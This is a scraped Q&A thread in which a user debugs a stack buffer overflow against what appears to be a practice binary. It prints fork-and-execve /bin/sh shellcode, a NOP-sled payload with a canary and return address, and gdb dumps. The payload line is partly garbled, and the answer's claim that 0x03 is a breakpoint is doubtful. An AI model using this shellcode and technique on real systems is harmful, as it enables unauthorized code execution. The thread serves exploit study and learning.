{
    "title": "buffer overflow-seg fault",
    "link": "https://reverseengineering.stackexchange.com/questions/11412/buffer-overflow-seg-fault",
    "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  I am trying to overflow a buffer, which has a size of 0x201 bytes, and get a shellcode. The program that contains the buffer,there is a call to\n  <code>\n   ptrace()\n  </code>\n  (on itself), therefore the shellcode I'm using calls fork and then\n  <code>\n   execve()\n  </code>\n  (as a child process)\n </p>\n <p>\n  So, here is what I'm feeding the buffer:\n </p>\n <pre><code>payload5=\"\\x6a\\x32\\x58\\x99\\xcd\\x80\\x89\\xc3\\x89\\xc1\\x6a\\x46\\x58\\xcd\\x80\\xb0\\x02\\xcd\\x80\\xb0\\x0b\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xd1\\xcd\\x80\"\n\ncanary=struct.pack('L', 3)\nret_addr=\\x10\\xda\\xff\\xff\ns=50\n\nbuf=(\"\\x90\" * (buf_lenlen(payload5)s))+payload5+\"\\x90\"*s+canary+\"\\x90\"*4+ret_addr\n</code></pre>\n <p>\n  Here is how my buffer looks like right after\n  <code>\n   strcpy()\n  </code>\n  :\n </p>\n <pre><code>0xffffd9e0: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffd9f0: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffda00: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffda10: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffda20: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffda30: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffda40: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffda50: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffda60: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffda70: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffda80: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffda90: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffdaa0: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffdab0: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffdac0: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffdad0: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffdae0: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffdaf0: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffdb00: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffdb10: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffdb20: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffdb30: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffdb40: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffdb50: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffdb60: 0x90909090  0x90909090  0x90909090  0x6a909090\n0xffffdb70: 0xcd995832  0x89c38980  0x58466ac1  0x02b080cd\n0xffffdb80: 0x0bb080cd  0x2f6e6852  0x2f686873  0x8969622f\n0xffffdb90: 0xcdd189e3  0x90909080  0x90909090  0x90909090\n0xffffdba0: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffdbb0: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffdbc0: 0x90909090  0x03909090  0x90909090  0xffffda10\n</code></pre>\n <p>\n  and I am definitely correctly overwriting the\n  <code>\n   eip\n  </code>\n  :\n </p>\n <pre><code>Stack level 0, frame at 0xffffdbd0:\neip = 0x8048595 in vulnerable; saved eip = 0xffffda10\ncalled by frame at 0x90909098\nArglist at 0xffffdbc8, args: \nLocals at 0xffffdbc8, Previous frame's sp is 0xffffdbd0\nSaved registers:\n   ebp at 0xffffdbc8, eip at 0xffffdbcc`\n</code></pre>\n <p>\n  The problem is that I am segfaulting at\n  <code>\n   0xffffdbc6\n  </code>\n  which goes past my return address.\n </p>\n <pre><code>(gdb) x/i 0xffffdbc6\n=> 0xffffdbc6:  add    %ch,0x6e(%ecx)\n</code></pre>\n <p>\n  I get the shell in\n  <code>\n   gdb\n  </code>\n  if i set\n  <code>\n   follow-fork-mode\n  </code>\n  child, and avoid segfaulting. But, when I call the actual program, I never get the shell (\n  <code>\n   jobs -l Segmentation fault\n  </code>\n  ).\n </p>\n <p>\n  I would think that the problem is with shellcode, when I used regular\n  <code>\n   execve\n  </code>\n  shellcode, my shell would just be killed (no segfault), but exactly the same shellcode has proven to work.\n </p>\n <p>\n  So, I really don't know where the problem is...\n </p>\n</div>\n</body></html>",
    "votes": "0",
    "answers": 1,
    "views": "384",
    "tags": [
        "assembly",
        "gdb",
        "shellcode",
        "buffer-overflow"
    ],
    "user": "shura",
    "time": "Nov 26, 2015 at 20:45",
    "comments": [],
    "answers_data": [
        {
            "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  So, I can't comment yet and I don't have the full answer but it appears that your program is segfaulting within your nopsled.  I think you are incorrect in stating that\n  <code>\n   0xffffdbc6\n  </code>\n  is past your return address.\n </p>\n <pre><code>0xffffdbc0: 0x90909090  0x03909090  0x90909090  0xffffda10\n</code></pre>\n <p>\n  Is what you list as the bottom of your stack ?\n </p>\n <p>\n  Here is it rewritten:\n </p>\n <pre><code>0xffffdbc0: 0x90909090  \n0xffffdbc4: 0x03909090\n0xffffdbc8: 0x90909090\n0xffffdbcc: 0xffffda10\n</code></pre>\n <p>\n  So,\n  <code>\n   0xffffdbc6\n  </code>\n  is NOT past your return address.\n </p>\n <p>\n  Could be wrong on this but I don't think I am. Isn't\n  <code>\n   0x03\n  </code>\n  a breakpoint?\n </p>\n <p>\n  Could it be causing you issues when you run the shellcode?  Maybe your shellcode doesn't exit gracefully, and so it's crashing even though you are forking.\n </p>\n <p>\n  Anyways hope this helps.\n </p>\n</div>\n</body></html>",
            "votes": "1",
            "user": "perror",
            "time": "Nov 26, 2015 at 20:47",
            "is_accepted": false,
            "comments": []
        }
    ]
}